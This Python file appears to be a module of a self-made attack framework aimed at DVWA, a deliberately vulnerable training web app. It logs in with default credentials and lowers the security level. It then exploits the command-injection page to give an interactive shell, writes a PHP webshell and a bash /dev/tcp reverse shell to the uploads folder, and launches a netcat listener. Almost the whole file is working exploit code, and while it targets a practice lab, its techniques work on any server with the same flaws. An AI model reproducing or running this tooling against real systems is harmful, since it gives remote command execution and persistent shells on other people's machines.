import requests
import os
from datetime import datetime
import subprocess
import webbrowser

class Tool:
    def __init__(self):
        self.name = "dvwa_web"
        self.target = "http://192.168.107.129"
        self.user = "admin"
        self.password = "password"
        self.upload_path = "/srv/dvwa/hackable/uploads"
        self.session = None
        self.logged_in = False
        self.listener_ip = "0.0.0.0"


    def show_options(self):
        print(colored("\nModule options (dvwa_web):", "orange"))

        options = [
            ("RHOST", self.target, "yes", "Target IP address or URL"),
            ("USERNAME", self.user, "yes", "DVWA username"),
            ("PASSWORD", self.password, "yes", "DVWA password"),
            ("UPLOAD_PATH", self.upload_path, "yes", "Server-side upload path"),
        ]

        header = f"{'Name':<15} {'Current Setting':<30} {'Required':<10} {'Description'}"
        print(colored(header, "yellow"))
        print("-" * 80)

        for name, value, required, desc in options:
            print(f"{colored(name, 'reset'):<15} {colored(value, 'green'):<30} {colored(required, 'red'):<10} {desc}")

    def show_help(self):
        if not self.logged_in:
            print("\n=== DVWA Web Exploitation Tool ===")
            print(f"Current target: {self.target}")
            print("Step 1: Type 'setup' to login and set security to Low")
            print("Commands:")
            print("  setup                    - Login + set security to Low")
            print("  set target <url/ip>      - Change target (auto-adds http://)")
            print("  help                     - Show this help")
            print("  back / exit              - Return to framework\n")
        else:
            print("\n=== DVWA Web Exploitation Tool ===")
            print(f"Target: {self.target}")
            print("Commands:")
            print("  shell                    - Interactive command shell (Part 1)")
            print("  upload_webshell          - Upload simple PHP webshell (Part 2)")
            print("  upload_revshell <ip> <port> - Upload reverse shell (Part 2)")
            print("  set target <url/ip>      - Change target")
            print("  help                     - Show this help")
            print("  back / exit              - Return to framework\n")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_help()
            return

        if low.startswith("set target"):
            value = cmd.split(maxsplit=2)[2].strip() if len(cmd.split()) >= 3 else ""
            if not value:
                print("Usage: set target <url/ip>")
                return
            if not value.startswith(("http://", "https://")):
                value = "http://" + value
            self.target = value.rstrip("/")
            print(f"[+] Target updated to {self.target}")
            return

        if low in ["exploit", "run", "setup"]:
            self._login()
            print(colored("Exploit ready. Available actions:", "green"))
            print("  shell                    - Start interactive shell")
            print("  upload_webshell          - Drop webshell")
            print("  upload_revshell <ip> <port> - Drop reverse shell")
            return

        if not self.logged_in:
            print("[-] Not logged in. Type 'setup' first.")
            return

        if low == "shell":
            self.interactive_shell()
            return

        if low == "upload_webshell":
            self.upload_webshell()
            return

        if low.startswith("upload_revshell"):
            parts = cmd.split()
            if len(parts) < 3:
                print("Usage: upload_revshell <your_ip> <port>")
                return
            self.upload_revshell(parts[1], parts[2])
            return

        if low in ["back", "exit", "quit"]:
            print("[*] Returning to Bandito framework...")
            return

        # Sanitized unknown command
        print(f"[-] Unknown command: '{cmd}'")
        print("Type 'help' for available commands.")
        self.show_help()

    def _login(self):
        if self.logged_in:
            print("[+] Already logged in")
            return

        print(f"[*] Logging into {self.target}...")
        self.session = requests.Session()

        login_url = f"{self.target}/login.php"
        r_get = self.session.get(login_url)

        token_marker = "name='user_token' value='"
        token_pos = r_get.text.find(token_marker)
        user_token = ""
        if token_pos != -1:
            start = token_pos + len(token_marker)
            end = r_get.text.find("'", start)
            user_token = r_get.text[start:end]

        login_data = {
            "username": self.user,
            "password": self.password,
            "user_token": user_token,
            "Login": "Login"
        }
        r_login = self.session.post(login_url, data=login_data, allow_redirects=True)

        if "Logout" in r_login.text:
            print("[+] Login successful")
        else:
            print("[-] Login failed - check target/credentials")
            return

        sec_url = f"{self.target}/security.php"
        self.session.post(sec_url, data={"security": "low", "seclev_submit": "Submit"})

        self.logged_in = True
        print("[+] Security level set to Low")
        self.show_help()

    def interactive_shell(self):
        print("\ndvwa> Interactive command shell (type 'exit' to return)\n")
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        while True:
            try:
                cmd = input("dvwa> ").strip()
                if cmd.lower() in ["exit", "back", "quit"]:
                    return
                if not cmd:
                    continue

                payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
                data = {"ip": payload, "Submit": "Submit"}

                r = self.session.post(vuln_url, data=data)

                if "<pre>" in r.text and "</pre>" in r.text:
                    output = r.text.split("<pre>")[1].split("</pre>")[0].strip()
                else:
                    output = r.text.strip()

                print(output if output else "[no output]")
                print("-" * 60)

            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                return

    def upload_webshell(self):
        webshell = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
        safe = webshell.replace("'", "'\\''")

        cmd = f"echo '{safe}' > {self.upload_path}/shell.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        print("[+] Webshell uploaded")
        print(f"Test in browser: {self.target}/hackable/uploads/shell.php?cmd=whoami")
        print("Examples: ?cmd=id, ?cmd=ip%20a, ?cmd=uname%20-a")

    def upload_revshell(self, attacker_ip=None, port=4444):
        if attacker_ip is None:
            attacker_ip = "0.0.0.0"  # Listen on all interfaces

        if not self.logged_in:
            self._login()

        print(f"[*] Uploading reverse shell â†’ {attacker_ip}:{port}")

        rev_content = f'<?php system("bash -c \'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\' 2>&1"); ?>'
        safe_content = rev_content.replace("'", "'\\''")

        cmd = f"echo '{safe_content}' > {self.upload_path}/rev.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        trigger_url = f"{self.target}/hackable/uploads/rev.php"

        print("[+] Reverse shell uploaded")
        print(f"Trigger URL: {trigger_url}")

        # === AUTOMATION: Try to open new terminal with nc ===

        listener_cmd = f"nc -lvnp {port}"
        print(f"[*] Attempting to open new terminal with listener: {listener_cmd}")

        opened = False

        # Try gnome-terminal (Ubuntu default)
        try:
            subprocess.Popen(["gnome-terminal", "--", "bash", "-c", listener_cmd + "; exec bash"])
            opened = True
            print("[+] Opened in gnome-terminal")
        except:
            pass

        # Try xterm (fallback)
        if not opened:
            try:
                subprocess.Popen(["xterm", "-e", listener_cmd])
                opened = True
                print("[+] Opened in xterm")
            except:
                pass

        # Try terminator (if installed)
        if not opened:
            try:
                subprocess.Popen(["terminator", "-e", listener_cmd])
                opened = True
                print("[+] Opened in terminator")
            except:
                pass

        if not opened:
            print("[-] Could not open new terminal automatically.")
            print(f"  Please open a new terminal manually and run: {listener_cmd}")

        # Open trigger URL
        print("[+] Opening trigger URL in browser...")
        import webbrowser
        webbrowser.open(trigger_url)

        print("\n" + "="*70)
        print("Reverse shell should connect soon!")
        print("Look for a new terminal window with netcat running.")
        print("Once connected, type commands there (whoami, ip a, id, pwd, etc.)")
        print("If no new terminal opened, start nc manually in a new window.")
        print("="*70)